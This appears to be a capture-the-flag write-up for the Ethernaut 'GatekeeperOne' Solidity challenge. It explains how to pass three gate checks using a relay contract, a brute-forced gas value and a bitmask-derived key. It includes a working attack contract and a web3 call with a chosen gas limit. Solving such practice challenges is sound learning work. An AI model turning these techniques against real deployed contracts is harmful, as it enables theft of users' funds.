gateOne: can be bypassed by using a contract so that `tx.origin != msg.sender`

gateTwo: adjust initial gas (had to bruteforce initial value, there must be a clever way to get this)

gateThree:

```
                       c        d
  -------- -------- -------- --------
  |       a        |        b        |

```

  - key = 64 bits
  - a = high 32 bits of key
  - b = low 32 bits of key
  - c = high 16 bits of b
  - d = low 16 bits of b

Then:

  - `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)` => `b == d` => `c == 0`
  - `uint32(uint64(_gateKey)) != uint64(_gateKey)` => `b != key` => `a != 0`
  - `uint32(uint64(_gateKey)) == uint16(tx.origin)` => `b == uint16(tx.origin)`

```
contract GatekeeperOne {
    function enter(bytes8 _gateKey) public returns (bool) {}
}

contract HackGatekeeperOne {
  function hack() public {
    GatekeeperOne gk1 = GatekeeperOne(<instance address>);

    bytes8 key = bytes8(0x1000000000000000) | bytes8(uint64(uint16(tx.origin)));

    gk1.enter(key);
  }
}
````

```
const abi = ...;
hackGK1Contract = new web3.eth.Contract(abi, '<contract address>');
hackGK1Contract.methods.hack().send({ from: player, gasLimit: 65933});
```
